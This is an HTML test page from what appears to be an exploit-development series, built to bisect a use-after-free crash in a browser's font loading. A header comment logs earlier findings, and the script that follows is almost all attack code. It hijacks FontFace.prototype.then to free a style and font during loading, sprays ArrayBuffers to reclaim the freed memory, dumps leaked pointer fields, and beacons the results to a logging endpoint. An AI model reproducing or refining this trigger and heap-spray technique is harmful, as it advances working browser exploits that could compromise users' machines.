<!--
  p665: R1-death bisect — p664 identical EXCEPT display:AUTO (default).
  p664 findings (8/8 loads): T/W leaks + rc++(100->101) stable; full 192B
  dump STATIC after initial writes (st82=0, opc=0 — no setStatus ever
  crosses the dangling ref); page dies IN round 1 trigger with display:swap
  (worse than p663 auto which completed R0-R3). Timer theory refuted.

  A/B logic:
    p665 completes R1+  => display:swap is the R1 killer (swap-specific path)
    p665 dies at R1 too  => killer is round-2 trigger machinery itself
                           (style/FontFace/add/load second pass)
  Substep beacons in round>=1: S1 style-inserted, S2 face-constructed,
  S3 fonts-added, S4 pre-load, S5 getter-fired, S6 spray-done.
  The last S* before silence = the killer step.
  ROUNDS=4 (p663 parity). Late snapshot kept (with auto, timer arms at 3s:
  if engine writes +0x98/+0xA8 timer fields through the ref, DUMP2 catches
  them — first direct observation of timer-field writes would be NEW signal).

  Beacon: P665-.
  CRASH_CLASS: HIGH (R1 death expected — that's the measurement).
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p665</title></head>
<body>p665: r1-death bisect (display:auto)
<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
<script>
(function() {
'use strict';
var L = document.getElementById('log');
var bQ = [];
function emit(tag, msg) {
  var s = tag + (msg ? ' ' + msg : '');
  L.textContent += s + '\n';
  bQ.push(s);
  if (bQ.length >= 2) flush();
}
function flush() {
  if (!bQ.length) return;
  var b = bQ.splice(0, 4).join('|');
  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P665-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
}
window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

emit('START', 'bisect auto r4');
flush();

var ROUNDS = 4;
var round = 0;
var results = [];

var sty = null, ff = null;
var armed = false;
var spray = [];
var snap1 = null;

Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (!armed) return undefined;
    armed = false;
    if (round >= 1) { emit('S5', 'getter-fired r' + round); flush(); }
    try { sty.remove(); } catch(e) {}
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;
    spray = [];
    for (var i = 0; i < 24; i++) {
      var ab = new ArrayBuffer(192);
      var dv = new DataView(ab);
      dv.setUint32(0x00, 100 + round, true);
      dv.setUint32(0x04, 0x5A5A0000 | round, true);
      dv.setUint32(0x08, i, true);
      spray.push(dv);
    }
    if (round >= 1) { emit('S6', 'spray-done r' + round); flush(); }
    return undefined;
  },
  set: function() {}
});

function dumpLane(dv) {
  var out = [];
  for (var off = 0; off <= 0xB8; off += 8) {
    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
  }
  return out.join(',');
}

function scanHit() {
  for (var i = 0; i < spray.length; i++) {
    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
  }
  return -1;
}

function beginRound() {
  sty = document.createElement('style');
  /* DELTA vs p664: NO font-display (default auto — p663 parity) */
  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
  document.head.appendChild(sty);
  if (round >= 1) { emit('S1', 'style-inserted r' + round); flush(); }
  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
  if (round >= 1) { emit('S2', 'face-constructed r' + round); flush(); }
  document.fonts.add(ff);
  if (round >= 1) { emit('S3', 'fonts-added r' + round); flush(); }
  void ff.loaded;
  window.__facesAlive = window.__facesAlive || [];
  window.__facesAlive.push(ff);
  armed = true;
  if (round >= 1) { emit('S4', 'pre-load r' + round); flush(); }
  document.fonts.load('1em f' + round + ', s' + round, 'AB');
  setTimeout(analyzeEarly, 150);
}

function analyzeEarly() {
  try {
    var hit = scanHit();
    if (hit < 0) {
      emit('R' + round, 'MISS');
      flush();
    } else {
      var dv = spray[hit];
      snap1 = dumpLane(dv);
      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
      results.push({ r: round, lane: hit,
        t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo),
        rc: dv.getUint32(0x00, true), st: dv.getUint8(0x82) });
      emit('R' + round, 'hit=' + hit + ' T=' + hex32(tHi) + hex32(tLo) +
           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
           ' st82=' + dv.getUint8(0x82) + ' opc=' + dv.getUint32(0x60, true));
      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
      flush();
    }
    setTimeout(function() { analyzeLate(hit); }, 3350);
  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
}

function analyzeLate(hit) {
  try {
    if (hit >= 0 && spray.length) {
      var dv = spray[hit];
      var snap2s = dumpLane(dv);
      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
           ' rc=' + dv.getUint32(0x00, true) +
           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
      flush();
    } else {
      emit('R' + round + 'LATE', 'alive (miss-round)');
      flush();
    }
    round++;
    if (round < ROUNDS) {
      emit('NEXT', 'round ' + round + ' in 250ms');
      flush();
      setTimeout(beginRound, 250);
    } else {
      var ts = {}, lanes = [];
      for (var k = 0; k < results.length; k++) {
        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
        lanes.push(results[k].lane);
      }
      var keys = Object.keys(ts);
      emit('SUMMARY', 'rounds=' + results.length + ' distinctT=' + keys.length +
           ' lanes=[' + lanes.join(',') + ']');
      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
      emit('ALIVE', 'end-r4-auto');
      flush();
    }
  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
}

setTimeout(beginRound, 50);

})();
</script>
</body></html>
